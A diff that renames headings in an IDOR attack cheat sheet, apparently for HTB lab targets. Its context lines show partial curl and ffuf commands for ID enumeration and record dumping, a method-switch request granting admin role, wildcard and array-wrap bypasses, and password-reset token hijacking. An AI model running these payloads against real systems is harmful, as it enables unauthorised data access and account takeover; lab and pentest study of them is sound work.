@@ -6,7 +6,7 @@
 
 ---
 
-## IDOR - Numeric ID Enumeration
+## enum idor numeric ids
 Enumerate sequential resource IDs.
 
 ```bash
@@ -17,7 +17,7 @@ for i in $(seq 1 1000); do code=$(curl -s -o /dev/null -w "%{http_code}" "{{URL:
 
 ---
 
-## IDOR - Numeric ID Diff
+## dump idor numeric records
 Pull each ID and look for sensitive fields.
 
 ```bash
@@ -28,7 +28,7 @@ for i in $(seq 1 100); do echo "=== $i ==="; curl -s "{{URL:url:http://target.ht
 
 ---
 
-## IDOR - UUID Enumeration via Wayback
+## enum idor uuids wayback
 Hunt UUIDs in archived URLs / source.
 
 ```bash
@@ -39,7 +39,7 @@ curl -s "https://web.archive.org/cdx/search/cdx?url={{DOMAIN:domain:target.htb}}
 
 ---
 
-## IDOR - GraphQL Object Reference
+## dump idor graphql record
 Fetch arbitrary record by ID.
 
 ```bash
@@ -50,7 +50,7 @@ curl -s -X POST {{URL:url:http://target.htb/graphql}} -H "Content-Type: applicat
 
 ---
 
-## IDOR - Mass Enumerate via Burp Intruder
+## enum idor burp intruder
 Use Burp Intruder Sniper / Pitchfork on the ID parameter.
 
 ```bash
@@ -61,7 +61,7 @@ echo "1. Send request to Intruder. 2. Mark id parameter. 3. Payload: numbers 1-1
 
 ---
 
-## IDOR - Method Switch Authorization
+## bypass idor method switch
 Sometimes only POST/PUT is auth-checked, GET is not.
 
 ```bash
@@ -73,7 +73,7 @@ curl -s -X PUT "{{URL:url:http://target.htb/api/admin/user/}}1" -d '{"role":"adm
 
 ---
 
-## IDOR - Path Traversal in IDs
+## bypass idor traversal ids
 Try traversal-style values.
 
 ```bash
@@ -84,7 +84,7 @@ echo "../1\n..%2f1\n%00admin\n0\n-1\n9999999"
 
 ---
 
-## IDOR - Add ID Parameter
+## inject idor extra params
 Try adding parameters not normally sent.
 
 ```bash
@@ -95,7 +95,7 @@ curl -s "{{URL:url:http://target.htb/api/profile}}?user_id={{ID:int:1}}&id={{ID:
 
 ---
 
-## IDOR - Array Wrap Bypass
+## bypass idor array wrap
 Wrap ID in array — backend may pick first.
 
 ```bash
@@ -106,7 +106,7 @@ curl -s -X POST {{URL:url:http://target.htb/api/transfer}} -H "Content-Type: app
 
 ---
 
-## IDOR - Wildcard
+## bypass idor wildcard
 Some APIs accept * to return all.
 
 ```bash
@@ -118,7 +118,7 @@ curl -s "{{URL:url:http://target.htb/api/users?id=*}}"
 
 ---
 
-## IDOR - JSON vs URL-Encoded
+## bypass idor content type
 Switching content-types may hit different validation.
 
 ```bash
@@ -131,7 +131,7 @@ curl -s -X POST {{URL:url:http://target.htb/api/transfer}} -H "Content-Type: app
 
 ---
 
-## IDOR - Force Browse Admin Endpoints
+## fuzz idor admin endpoints
 Discover hidden admin endpoints with auth.
 
 ```bash
@@ -142,7 +142,7 @@ ffuf -u {{URL:url:http://target.htb/}}FUZZ -w {{WORDLIST:wordlist:/usr/share/sec
 
 ---
 
-## IDOR - User Hash Substitution
+## decode idor hashed ids
 Some APIs use hashed/encoded IDs — try common decodings.
 
 ```bash
@@ -155,7 +155,7 @@ echo -n "1" | md5sum
 
 ---
 
-## IDOR - Password Reset Token Hijack
+## hijack idor reset token
 Request reset for victim, see if response includes token.
 
 ```bash
@@ -166,7 +166,7 @@ curl -s -X POST {{URL:url:http://target.htb/forgot}} -d "email={{EMAIL:str:victi
 
 ---
 
-## IDOR - Compare Responses
+## diff idor responses
 Diff two requests with same auth but different IDs.
 
 ```bash
